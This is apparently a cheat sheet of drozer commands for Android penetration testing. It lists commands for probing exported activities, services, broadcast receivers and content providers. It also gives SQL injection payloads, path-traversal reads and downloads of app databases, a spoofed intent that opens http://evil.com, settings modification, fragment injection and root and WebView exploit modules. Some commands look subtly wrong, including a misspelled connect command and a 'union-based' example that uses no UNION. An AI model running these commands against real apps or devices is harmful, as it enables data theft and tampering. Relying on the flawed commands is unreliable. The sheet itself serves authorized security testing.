# Drozer Cheat Sheet

## Installation & Setup

### Installation
```bash
# Install drozer
pip install drozer

# Port forwarding
adb forward tcp:31415 tcp:31415

# Start drozer console
drozer console connect

# Start drozer server
drozer server start
```

### Connecting to Agent
```bash
# Connect to embedded server
drozer console connect --server 127.0.0.1:31415

# connect after forwarding
drozer cosole connect

# Connect to remote device
drozer console connect --server 192.168.1.100:31415

# Connect with specific device
drozer console connect --device emulator-5554
```

## Basic Commands

### Help & Information
```bash
# List all modules
list

# Search for modules
list -f keyword

# Get module information
help module.name

# Show module usage
run module.name -h

# Show drozer version
version
```

### Package Information
```bash
# List all installed packages
run app.package.list

# Find package by keyword
run app.package.list -f keyword

# Get package information
run app.package.info -a com.example.app

# Show package manifest
run app.package.manifest com.example.app

# List attack surface
run app.package.attacksurface com.example.app
```

## Vulnerability Assessment

### Attack Surface Analysis
```bash
# Check for exported components
run app.package.attacksurface com.example.app

# List exported activities
run app.activity.info -a com.example.app

# List exported services
run app.service.info -a com.example.app

# List exported broadcast receivers
run app.broadcast.info -a com.example.app

# List content providers
run app.provider.info -a com.example.app
```

### Activity Testing
```bash
# List all activities
run app.activity.info -a com.example.app

# Start activity
run app.activity.start --component com.example.app com.example.app.MainActivity

# Start activity with extras
run app.activity.start --component com.example.app com.example.app.MainActivity --extra string key value

# Find activities with no permission protection
run app.activity.info -p null
```

### Service Testing
```bash
# List services
run app.service.info -a com.example.app

# Start service
run app.service.start --component com.example.app com.example.app.MyService

# Stop service
run app.service.stop --component com.example.app com.example.app.MyService

# Send command to service
run app.service.send com.example.app com.example.app.MyService --msg 1 2 3 --extra string test hello --bundle-as-obj
```

### Broadcast Receiver Testing
```bash
# List broadcast receivers
run app.broadcast.info -a com.example.app

# Send broadcast
run app.broadcast.send --component com.example.app com.example.app.MyReceiver

# Send broadcast with intent action
run app.broadcast.send --action android.intent.action.BOOT_COMPLETED

# Send broadcast with extras
run app.broadcast.send --action com.example.CUSTOM_ACTION --extra string username admin --extra string password secret
```

## Content Provider Exploitation

### Provider Enumeration
```bash
# Find content providers
run app.provider.finduri com.example.app

# Get provider info
run app.provider.info -a com.example.app

# Query provider
run app.provider.query content://com.example.app.provider/data

# Query with projection
run app.provider.query content://com.example.app.provider/data --projection "_id,name,password"

# Query with selection
run app.provider.query content://com.example.app.provider/data --selection "username='admin'"
```

### SQL Injection Testing
```bash
# Test for SQL injection in projection
run app.provider.query content://com.example.app.provider/data --projection "* FROM SQLITE_MASTER WHERE type='table';--"

# Test for SQL injection in selection
run app.provider.query content://com.example.app.provider/data --selection "1=1"

# Union-based SQL injection
run app.provider.query content://com.example.app.provider/data --projection "* FROM sqlite_master WHERE type!='meta';--"
```

### File System Access
```bash
# Read files through provider
run app.provider.read content://com.example.app.provider/../../system/etc/hosts

# Download file
run app.provider.download content://com.example.app.provider/../../data/data/com.example.app/databases/users.db /tmp/users.db

# List files in directory
run app.provider.query content://com.example.app.provider/..%2F..%2F..%2F..%2F..%2F..%2F..%2Fdata%2Fdata%2Fcom.example.app%2Fdatabases%2F
```

## Privilege Escalation

### Root Detection
```bash
# Check for root
run tools.setup.root

# Check su availability
run tools.setup.su
```

### Application Privileges
```bash
# Check app permissions
run app.package.permissions -a com.example.app

# List dangerous permissions
run app.package.permissions -a com.example.app -d

# Check for permission protection vulnerabilities
run scanner.provider.traversal -a com.example.app

# Check for injection vulnerabilities
run scanner.provider.injection -a com.example.app
```

## Device Information

### System Information
```bash
# Get device info
run device.info

# Get battery info
run device.battery.info

# Get telephony info
run device.telephony.info

# Get location info
run device.location.info
```

### Settings
```bash
# List all settings
run app.provider.query content://settings/secure

# Read specific setting
run app.provider.query content://settings/secure --selection "name='adb_enabled'"

# Modify settings (if vulnerable)
run app.provider.update content://settings/secure --selection "name='adb_enabled'" --string value "1"
```

## Advanced Techniques

### Shell Commands
```bash
# Execute shell commands
shell whoami

# Get full shell
run tools.setup.shell

# Upload files
file upload /local/path /remote/path

# Download files
file download /remote/path /local/path
```

### Intent Spoofing
```bash
# Send intent with data
run app.activity.start --component com.android.browser com.android.browser.BrowserActivity --data-uri http://evil.com

# Send intent with flags
run app.activity.start --component com.example.app com.example.app.MainActivity --flags 0x10000000
```

### Fragment Injection
```bash
# Test for fragment injection
run app.activity.start --component com.example.app com.example.app.MainActivity --extra string :android:show_fragment com.example.app.EvilFragment
```

## Automated Scanners

### Vulnerability Scanning
```bash
# Run all scanners
run scanner.misc.native
run scanner.misc.writablefiles
run scanner.misc.secretcodes

# Scan for directory traversal
run scanner.provider.traversal -a com.example.app

# Scan for SQL injection
run scanner.provider.injection -a com.example.app

# Scan for information disclosure
run scanner.provider.sqltables -a com.example.app
```

### Misconfiguration Scanner
```bash
# Check for debugable apps
run scanner.misc.debuggable

# Check for backup enabled
run scanner.misc.backup

# Check for debuggable webviews
run scanner.misc.webview
```

## Useful Modules

### Information Gathering
```bash
# Get detailed app info
run app.package.debuggable
run app.package.backup

# Check for native code
run scanner.misc.native

# Check for shared libraries
run tool.findlibrary
```

### Exploitation
```bash
# Attempt privilege escalation
run exploit.root

# Exploit WebView vulnerabilities
run scanner.misc.webview
run exploit.webview.addjavascriptinterface
```

## Tips & Best Practices

1. **Always test on authorized devices/systems only**
2. **Use drozer in controlled environments**
3. **Document findings for penetration testing reports**
4. **Combine automated scanning with manual testing**
5. **Verify vulnerabilities before exploitation**
6. **Understand the impact of each vulnerability**

### Common Flags
```bash
# -a: Specify package name
# -h: Show help
# -v: Verbose output
# -d: Device selection
# --server: Specify server address
```

This cheat sheet covers the most common drozer commands for Android penetration testing. Always ensure you have proper authorization before testing any application.
